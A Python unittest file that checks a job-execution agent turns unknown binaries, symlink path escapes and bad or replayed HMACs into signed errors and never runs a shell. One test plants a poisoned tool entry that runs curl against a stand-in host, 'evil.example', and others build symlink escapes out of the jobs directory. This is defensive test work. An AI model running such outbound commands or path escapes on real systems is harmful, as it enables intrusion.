#!/usr/bin/env python3
"""Docs §12.4: unknown bin / path escape / bad HMAC is a signed error, not a shell.

ALLOWED_BINS only. Paths stay under jobs root. Invalid HMAC must not exec.
The fleet-wsexec harness path is a name-only unsigned tool request; argv still
comes from TOOLS_BY_JOB. Failures write result-{req_id}.json HMAC-signed by the
agent so the driver can reject a harness-forged "ok".
"""
from __future__ import annotations

import hashlib
import hmac
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

LAB = Path(__file__).resolve().parents[1]
AGENT_PATH = LAB / "workspace" / "workspace_agent.py"

PWN_MARK = "wsexec-must-not-exec"


def load_agent(fleet_dir: Path, jobs_root: Path):
    os.environ["FLEET_DIR"] = str(fleet_dir)
    os.environ["FLEET_JOBS_ROOT"] = str(jobs_root)
    os.environ["FLEET_ALLOW_RAW_EXEC"] = "0"
    os.environ["FLEET_HANDSHAKE_SECRET"] = "wsexec-signed-error-test-secret"
    for k in list(sys.modules):
        if k.startswith("workspace_agent_wsexec_signed"):
            del sys.modules[k]
    name = f"workspace_agent_wsexec_signed_{jobs_root.name}"
    spec = importlib.util.spec_from_file_location(name, AGENT_PATH)
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    mod.FLEET = fleet_dir
    return mod


def _init_repo(src: Path) -> None:
    src.mkdir(parents=True)
    (src / "README").write_text("wsexec-signed-error-src\n", encoding="utf-8")
    subprocess.run(["git", "init", "-q", "-b", "main", str(src)], check=True, capture_output=True)
    subprocess.run(
        ["git", "-C", str(src), "config", "user.email", "t@example.test"],
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "-C", str(src), "config", "user.name", "t"],
        check=True,
        capture_output=True,
    )
    subprocess.run(["git", "-C", str(src), "add", "README"], check=True, capture_output=True)
    subprocess.run(
        ["git", "-C", str(src), "commit", "-q", "-m", "init"],
        check=True,
        capture_output=True,
    )


class WsexecSignedErrorTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="fleet-wsexec-signed-"))
        self.fleet = self.tmp / ".fleet"
        self.jobs = self.tmp / "jobs"
        self.src = self.tmp / "src-repo"
        self.fleet.mkdir()
        self.jobs.mkdir()
        _init_repo(self.src)
        self.agent = load_agent(self.fleet, self.jobs)
        self.job_id = "job-wsexec-signed-1"
        self.work_dir = self.jobs / self.job_id / "repo"
        self.seen_cmds: list = []
        self.real_run = self.agent.subprocess.run
        self.agent.subprocess.run = self._spy_run  # type: ignore[method-assign]

    def tearDown(self):
        self.agent.subprocess.run = self.real_run  # type: ignore[method-assign]
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _spy_run(self, cmd, *args, **kwargs):
        argv = list(cmd) if isinstance(cmd, (list, tuple)) else [cmd]
        self.seen_cmds.append(argv)
        self.assertFalse(
            kwargs.get("shell"),
            f"wsexec path must not set shell=True: {argv!r}",
        )
        self.assertIsInstance(
            cmd,
            (list, tuple),
            f"exec must be an argv list, not a shell string: {cmd!r}",
        )
        return self.real_run(cmd, *args, **kwargs)

    def sign(self, req: dict, secret: str | None = None) -> dict:
        body = {k: v for k, v in req.items() if k != "hmac"}
        raw = self.agent.canonical_json(body).encode()
        key = (secret if secret is not None else self.agent.handshake_secret()).encode()
        body["hmac"] = hmac.new(key, raw, hashlib.sha256).hexdigest()
        return body

    def _read_result(self, req_id: str) -> dict:
        path = self.fleet / f"result-{req_id}.json"
        self.assertTrue(path.is_file(), f"missing signed result {path}")
        return json.loads(path.read_text(encoding="utf-8"))

    def _assert_signed(self, body: dict) -> None:
        mac = body.get("hmac") or ""
        self.assertTrue(mac, f"result must be HMAC-signed: {body}")
        unsigned = {k: v for k, v in body.items() if k != "hmac"}
        expect = self.agent.sign_body(unsigned)["hmac"]
        self.assertTrue(
            hmac.compare_digest(str(mac), str(expect)),
            f"result hmac does not verify: {body}",
        )

    def _assert_signed_error(self, body: dict, *needles: str) -> None:
        self.assertFalse(body.get("ok"), f"must be an error result: {body}")
        self._assert_signed(body)
        self.assertEqual(body.get("stdout") or "", "", f"error must not carry exec stdout: {body}")
        blob = f"{body.get('error') or ''} {body.get('stderr') or ''}".lower()
        for n in needles:
            self.assertIn(n.lower(), blob, body)

    def _assert_never_ran(self, *bins: str) -> None:
        names = {Path(str(cmd[0])).name for cmd in self.seen_cmds if cmd}
        for b in bins:
            self.assertNotIn(
                Path(b).name,
                names,
                f"{b} must not exec; seen={self.seen_cmds!r}",
            )

    def _assert_never_ran_shell(self) -> None:
        for cmd in self.seen_cmds:
            if not cmd:
                continue
            base = Path(str(cmd[0])).name
            arg1 = str(cmd[1]) if len(cmd) > 1 else ""
            self.assertNotIn(
                base,
                {"bash", "sh"},
                f"failure path must not exec a shell: {cmd!r}",
            )
            self.assertNotIn(arg1, ("-lc", "-c", "-l"))

    def _assert_never_ran_pwn(self) -> None:
        joined = " ".join(" ".join(str(x) for x in cmd) for cmd in self.seen_cmds)
        self.assertNotIn(PWN_MARK, joined, f"pwn marker reached exec: {self.seen_cmds!r}")
        self.assertFalse(
            (self.work_dir / f"{PWN_MARK}.txt").exists(),
            "failure path must not create a marker file",
        )

    def _provision_ok(self) -> None:
        req = self.sign(
            {
                "job_id": self.job_id,
                "action": "provision",
                "req_id": "prov-ok",
                "repo_url": str(self.src),
                "git_ref": "main",
                "work_dir": str(self.work_dir),
                "commands": [],
                "smoke_commands": [],
                "env": {},
                "tools": {
                    "say": {"argv": ["echo", "wsexec-ok"], "description": "echo"},
                },
            }
        )
        self.agent.handle_request(req)
        body = self._read_result("prov-ok")
        self.assertTrue(body.get("ok"), body)
        self._assert_signed(body)

    def test_handle_request_unknown_bin_is_signed_error_not_a_shell(self):
        """Poisoned TOOLS_BY_JOB curl writes a signed error and does not exec."""
        self._provision_ok()
        self.seen_cmds.clear()
        self.agent.TOOLS_BY_JOB[self.job_id] = {
            "evil": {"argv": ["curl", "http://evil.example", PWN_MARK], "description": ""}
        }
        self.agent.handle_request(
            {
                "job_id": self.job_id,
                "action": "tool",
                "req_id": "wsexec-unknown-bin",
                "tool": "evil",
                "cwd": str(self.work_dir),
            }
        )
        body = self._read_result("wsexec-unknown-bin")
        self._assert_signed_error(body, "allowlisted")
        self.assertIn("curl", (body.get("error") or "").lower())
        self._assert_never_ran("curl", "bash", "sh")
        self._assert_never_ran_shell()
        self._assert_never_ran_pwn()

    def test_handle_request_path_escape_is_signed_error(self):
        """cwd that is a symlink out of jobs writes a signed error and does not exec."""
        self._provision_ok()
        self.seen_cmds.clear()
        outside = self.tmp / "outside-jobs"
        outside.mkdir()
        link = self.jobs / self.job_id / "escape-link"
        link.symlink_to(outside)
        self.agent.handle_request(
            {
                "job_id": self.job_id,
                "action": "tool",
                "req_id": "wsexec-cwd-symlink",
                "tool": "say",
                "cwd": str(link),
            }
        )
        body = self._read_result("wsexec-cwd-symlink")
        self._assert_signed_error(body, "outside")
        echo_after_link = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "echo"]
        self.assertEqual(echo_after_link, [], f"symlink cwd must not exec: {self.seen_cmds!r}")

    def test_handle_request_bad_hmac_is_signed_error_not_a_clone(self):
        """Wrong-key provision HMAC writes a signed error and does not git clone."""
        wd = self.jobs / "job-hmac-wrong" / "repo"
        req = self.sign(
            {
                "job_id": "job-hmac-wrong",
                "action": "provision",
                "req_id": "hmac-wrong",
                "repo_url": str(self.src),
                "git_ref": "main",
                "work_dir": str(wd),
                "commands": [f"echo {PWN_MARK}"],
                "smoke_commands": [],
                "env": {},
                "tools": {},
            },
            secret="wrong-handshake-secret",
        )
        self.agent.handle_request(req)
        body = self._read_result("hmac-wrong")
        self._assert_signed_error(body, "hmac")
        self.assertFalse(wd.exists(), "wrong hmac must not create work_dir")
        git_clones = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "git"]
        self.assertEqual(git_clones, [], f"wrong hmac must not exec git: {self.seen_cmds!r}")
        self._assert_never_ran_shell()

    def test_handle_request_replayed_hmac_is_signed_error_not_a_clone(self):
        """Second handle_request of the same signed provision is a signed replay error."""
        job = "job-hmac-replay"
        wd = self.jobs / job / "repo"
        req = self.sign(
            {
                "job_id": job,
                "action": "provision",
                "req_id": "hmac-replay-once",
                "repo_url": str(self.src),
                "git_ref": "main",
                "work_dir": str(wd),
                "commands": [],
                "smoke_commands": [],
                "env": {},
                "tools": {},
            }
        )
        self.agent.handle_request(req)
        first = self._read_result("hmac-replay-once")
        self.assertTrue(first.get("ok"), first)
        self.assertTrue(wd.is_dir(), wd)
        marker = wd / "no-second-clone"
        marker.write_text("keep\n", encoding="utf-8")
        (self.fleet / "result-hmac-replay-once.json").unlink()
        self.seen_cmds.clear()
        self.agent.handle_request(req)
        body = self._read_result("hmac-replay-once")
        self._assert_signed_error(body, "hmac", "replay")
        git_clones = [
            c
            for c in self.seen_cmds
            if c and Path(str(c[0])).name == "git" and "clone" in c
        ]
        self.assertEqual(git_clones, [], f"replay must not clone: {self.seen_cmds!r}")
        self.assertTrue(marker.is_file(), "replay must not re-clone (git_clone rmtree dest)")

    def test_handle_request_provision_work_dir_symlink_escape_is_signed_error(self):
        """provision work_dir that is a symlink out of jobs is a signed error, not a clone."""
        outside = self.tmp / "escaped-outside"
        outside.mkdir()
        link = self.jobs / "job-escape-wd-link" / "repo"
        link.parent.mkdir(parents=True)
        link.symlink_to(outside)
        self.seen_cmds.clear()
        self.agent.handle_request(
            self.sign(
                {
                    "job_id": "job-escape-wd-link",
                    "action": "provision",
                    "req_id": "prov-wd-symlink",
                    "repo_url": str(self.src),
                    "git_ref": "main",
                    "work_dir": str(link),
                    "commands": [f"echo {PWN_MARK}"],
                    "smoke_commands": [],
                    "env": {},
                    "tools": {},
                }
            )
        )
        body = self._read_result("prov-wd-symlink")
        self._assert_signed_error(body, "outside")
        git_clones = [
            c
            for c in self.seen_cmds
            if c and Path(str(c[0])).name == "git" and "clone" in c
        ]
        self.assertEqual(git_clones, [], f"symlink work_dir must not clone: {self.seen_cmds!r}")
        self.assertTrue(link.is_symlink(), "escaped work_dir symlink must be left in place")
        self.assertFalse((outside / "README").exists(), "clone must not land outside jobs")
        self._assert_never_ran_shell()


if __name__ == "__main__":
    unittest.main(verbosity=2)
